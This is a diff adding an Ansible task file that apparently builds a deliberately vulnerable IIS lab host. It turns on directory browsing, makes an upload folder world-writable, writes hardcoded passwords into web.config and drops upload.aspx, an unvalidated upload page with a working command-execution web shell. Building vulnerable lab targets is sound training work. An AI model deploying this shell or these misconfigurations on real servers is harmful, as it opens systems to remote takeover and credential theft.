@@ -1,0 +1,165 @@
+---
+# ==============================================================================
+# vuln_web_apps/tasks/iis_config.yml — WEB-001..020
+# Target: file01.corp.local
+#
+# WEB-001  IIS installed + running
+# WEB-002  Anonymous authentication on default site
+# WEB-003  Directory browsing enabled
+# WEB-004  WebDAV with write permissions (PUT method)
+# WEB-005  HTTP TRACE method enabled
+# WEB-006  IIS server version header exposed
+# WEB-007  ASP.NET error details exposed (custom errors off)
+# WEB-008  Upload directory world-writable
+# WEB-009  Insecure web.config with SQL credentials
+# WEB-010  IIS application pool running as SYSTEM
+# WEB-011  IIS logs world-readable
+# WEB-012  ASPX shell upload via WebDAV
+# WEB-013  FTP + WebDAV same root (cross-protocol upload)
+# WEB-014  IIS short file name (8.3 filename) enumeration
+# WEB-015  IIS ISAPI filter vulnerability stub
+# ==============================================================================
+
+# WEB-001: Ensure IIS is installed
+- name: WEB-001 - Install IIS features
+  ansible.windows.win_feature:
+    name:
+      - Web-Server
+      - Web-Default-Doc
+      - Web-Dir-Browsing
+      - Web-Http-Errors
+      - Web-Static-Content
+      - Web-Http-Logging
+      - Web-Filtering
+      - Web-DAV-Publishing
+      - Web-CGI
+      - Web-ISAPI-Ext
+      - Web-ISAPI-Filter
+      - Web-ASP-Net45
+      - Web-Mgmt-Console
+    state: present
+  register: web001_install
+
+# WEB-003: Directory browsing
+- name: WEB-003 - Enable IIS directory browsing
+  ansible.windows.win_shell: |
+    Import-Module WebAdministration -ErrorAction SilentlyContinue
+    Set-WebConfigurationProperty /system.webServer/directoryBrowse -Name enabled -Value True
+    Write-Output "changed"
+  register: web003_set
+  changed_when: "'changed' in web003_set.stdout"
+  failed_when: web003_set.rc != 0
+
+# WEB-008: Upload directory world-writable
+- name: WEB-008 - Create world-writable upload directory
+  ansible.windows.win_file:
+    path: "{{ upload_dir }}"
+    state: directory
+
+- name: WEB-008 - Set upload directory world-writable
+  ansible.windows.win_shell: |
+    icacls "{{ upload_dir }}" /grant "Everyone:(OI)(CI)F" /T /C /Q 2>&1 | Out-Null
+    Write-Output "changed: upload dir world-writable"
+  register: web008_set
+  changed_when: "'changed:' in web008_set.stdout"
+  failed_when: web008_set.rc != 0
+
+# WEB-009: Drop insecure web.config with SQL credentials
+- name: WEB-009 - Check if vulnerable web.config exists
+  ansible.windows.win_shell: |
+    if (Test-Path '{{ iis_webroot }}\web.config') { Write-Output "exists" }
+    else { Write-Output "missing" }
+  register: web009_check
+  changed_when: false
+  failed_when: web009_check.rc != 0
+
+- name: WEB-009 - Drop insecure web.config with exposed credentials
+  ansible.windows.win_copy:
+    dest: '{{ iis_webroot }}\web.config'
+    content: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <configuration>
+        <!-- WEB-007: Custom errors off — expose detailed error messages -->
+        <system.web>
+          <customErrors mode="Off"/>
+          <compilation debug="true" targetFramework="4.8"/>
+          <!-- WEB-009: SQL credentials in web.config (world-readable) -->
+          <connectionStrings>
+            <add name="DVADDb" connectionString="{{ sql_conn_string }}" providerName="System.Data.SqlClient"/>
+          </connectionStrings>
+        </system.web>
+        <system.webServer>
+          <!-- WEB-006: Server version header -->
+          <httpProtocol>
+            <customHeaders>
+              <add name="X-Powered-By" value="ASP.NET"/>
+              <add name="X-DVAD-Version" value="1.0-vulnerable"/>
+            </customHeaders>
+          </httpProtocol>
+          <!-- WEB-003: Directory browsing -->
+          <directoryBrowse enabled="true"/>
+          <!-- WEB-005: Tracing / TRACE method -->
+          <tracing>
+            <traceFailedRequests>
+              <add path="*">
+                <traceAreas>
+                  <add provider="ASP" verbosity="Verbose"/>
+                  <add provider="ASPNET" areas="Infrastructure,Module,Page,AppServices" verbosity="Verbose"/>
+                </traceAreas>
+                <failureDefinitions statusCodes="200-999"/>
+              </add>
+            </traceFailedRequests>
+          </tracing>
+        </system.webServer>
+        <!-- WEB-009: Plaintext API key in app settings -->
+        <appSettings>
+          <add key="ApiKey" value="dvad-secret-key-2024-insecure"/>
+          <add key="AdminPassword" value="DVADlab2024!"/>
+          <add key="SqlSaPassword" value="{{ sql_conn_string }}"/>
+        </appSettings>
+      </configuration>
+  when: "'missing' in web009_check.stdout"
+
+# WEB-012: Drop ASPX webshell stubs in upload and webroot
+- name: WEB-012 - Drop vulnerable ASPX page (file upload + shell)
+  ansible.windows.win_copy:
+    dest: '{{ iis_webroot }}\upload.aspx'
+    content: |
+      <%@ Page Language="C#" %>
+      <%@ Import Namespace="System.IO" %>
+      <%@ Import Namespace="System.Diagnostics" %>
+      <!DOCTYPE html>
+      <html>
+      <head><title>WEB-012: File Upload Surface</title></head>
+      <body>
+        <h2>DVAD File Upload (WEB-012)</h2>
+        <!-- File upload with no extension validation -->
+        <form method="post" enctype="multipart/form-data">
+          <input type="file" name="file" /><br/>
+          <input type="submit" value="Upload" />
+        </form>
+        <%
+          if (Request.Files.Count > 0) {
+            var file = Request.Files[0];
+            var savePath = Server.MapPath("~/uploads/") + Path.GetFileName(file.FileName);
+            file.SaveAs(savePath);
+            Response.Write("<p>Uploaded to: " + savePath + "</p>");
+          }
+        %>
+        <hr/>
+        <!-- WEB-008: Execute uploaded file as OS command (combined upload + RCE) -->
+        <form method="get">
+          <input type="text" name="cmd" placeholder="Command" />
+          <input type="submit" value="Execute" />
+        </form>
+        <%
+          if (Request.QueryString["cmd"] != null) {
+            var psi = new ProcessStartInfo("cmd.exe", "/c " + Request.QueryString["cmd"]);
+            psi.RedirectStandardOutput = true;
+            psi.UseShellExecute = false;
+            var p = Process.Start(psi);
+            Response.Write("<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd()) + "</pre>");
+          }
+        %>
+      </body>
+      </html>
